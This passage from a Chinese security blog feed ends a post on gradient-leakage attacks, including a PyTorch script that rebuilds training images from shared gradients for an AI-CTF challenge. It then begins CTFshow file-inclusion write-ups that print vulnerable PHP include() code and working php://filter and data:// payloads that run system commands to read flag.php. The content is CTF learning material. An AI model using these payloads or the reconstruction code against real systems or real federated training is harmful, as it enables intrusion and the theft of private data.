class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.8283em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.10903em;">N</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.4138em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mpunct mtight">,</span><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>平均后进行权重更新</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>W</mi><mrow><mi>t</mi><mo>+</mo><mn>1</mn></mrow></msub><mo>=</mo><msub><mi>W</mi><mi>t</mi></msub><mo>−</mo><mi>η</mi><mi mathvariant="normal">∇</mi><msub><mi>W</mi><mi>t</mi></msub></mrow><annotation encoding="application/x-tex">W_ {t+1}=W_ {t}-\eta   \nabla W_ {t}  
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8917em;vertical-align:-0.2083em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span><span class="mbin mtight">+</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2083em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">η</span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></p>
<p>而现在由于梯度共享，所以我们的目标就是从梯度去对原始数据进行恢复</p>
<p>为了从梯度中恢复出数据，我们首先随机初始化一对伪输入x’和标签y‘。然后将其输入模型并获取伪梯度</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>=</mo><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\nabla W&#x27;=  \frac {\partial  \ell(F(x&#x27;,W),y&#x27;)}{\partial W} 
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8019em;"></span><span class="mord">∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.1149em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p>
<p>优化伪梯度让其接近原始梯度的过程中，伪数据也会逐渐接近原始的真实训练数据。</p>
<p>给定某一步的梯度，通过最小化如下目标来获得训练数据</p>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msup><mi>x</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo separator="true">,</mo><msup><mi>y</mi><mrow><mo mathvariant="normal">′</mo><mo lspace="0em" rspace="0em">∗</mo></mrow></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∇</mi><msup><mi>W</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo>=</mo><mi>a</mi><mi>r</mi><mi>g</mi><mi><munder><mo><mi>min</mi><mo>⁡</mo></mo><mrow><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow></munder></mi><mi mathvariant="normal">∣</mi><mi mathvariant="normal">∣</mi><mfrac><mrow><mi mathvariant="normal">∂</mi><mi mathvariant="normal">ℓ</mi><mo stretchy="false">(</mo><mi>F</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><mi>W</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo stretchy="false">)</mo></mrow><mrow><mi mathvariant="normal">∂</mi><mi>W</mi></mrow></mfrac><mo>−</mo><mi mathvariant="normal">∇</mi><mi>W</mi><mi mathvariant="normal">∣</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup></mrow><annotation encoding="application/x-tex">x&#x27;^{*},y&#x27;^{*}=arg \underset{x&#x27;,y&#x27;} \min |\nabla W&#x27;- \nabla W|^ {2}=arg \underset{x&#x27;,y&#x27;} \min ||\frac {\partial \ell(F(x&#x27;,W),y&#x27;)}{\partial W}-\nabla W||^ {2}
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.9963em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight"><span class="mord mtight">∗</span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.682em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∇</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8019em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.309em;vertical-align:-0.8801em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord"><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.6679em;"><span style="top:-2.356em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct mtight">,</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6828em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop"><span class="mop">min</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span></span></span></span></span></span></span><span class="mord">∣∣</span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.4289em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord">ℓ</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1.1141em;vertical-align:-0.25em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mord">∣</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span></span></p>
<p><img src="https://s2.loli.net/2023/11/15/oW7iNazH62uURIT.png" alt=""></p>
<h2 id="防御手段">防御手段</h2>
<p>同时，在给出攻击方法的同时，论文也针对性讨论了防御手段。另外也发现了部分升级版攻击手法，之后会继续尝试复现。</p>
<p>使用加密技术对梯度数据进行加密，或者将幅度较小的梯度剪枝为0.另外，论文以外也有人尝试过将梯度添加噪声。</p>
<h2 id="例题尝试">例题尝试</h2>
<p>*<strong>CTF2022-Alice’s challenge</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torch.nn.functional <span class="keyword">as</span> F</span><br><span class="line"><span class="keyword">from</span> torchvision <span class="keyword">import</span> transforms</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br><span class="line"></span><br><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br><span class="line"></span><br><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br><span class="line"></span><br><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
<p>详解见<a href="https://wh1tej0ker.github.io/2023/11/17/AI-CTF%EF%BC%881%EF%BC%89Alice/">AI-CTF（1）Alice-AI系列 | Wh1teJ0ker</a></p>
<p>但是这份代码目前也存在一定问题，还有参数需要调整，恢复效果不佳。</p>
]]></content>
      <categories>
        <category>AI</category>
        <category>AI安全</category>
      </categories>
      <tags>
        <tag>AI</tag>
        <tag>梯度泄露攻击</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow-文件包含</title>
    <url>/2024/01/19/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1>CTFshow-文件包含</h1>
<h2 id="web78">web78</h2>
<h3 id="源码">源码</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload">payload</h3>
<p>文件包含，伪协议的利用，可以使用的方法有很多</p>
<h4 id="方法一">方法一</h4>
<p>php协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h4 id="方法二">方法二</h4>
<p>data协议+命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; </span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="web79">web79</h2>
<h3 id="源码-2">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-2">payload</h3>
<p>过滤了php，可以考虑的办法就是对php绕过或者是改用其他协议</p>
<p>这边选择直接使用data协议+命令执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&quot;tac%20flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
<p>注意跟上题不同的一点，因为过滤了php，所以在php代码执行环境的方法需要变一下</p>
<h2 id="web80">web80</h2>
<h3 id="源码-3">源码</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="payload-3">payload</h3>
<p>这里将data协议也过滤了</p>
<p>这里学到一个新方法，利用文件日志包含进行getshell的操作</p>
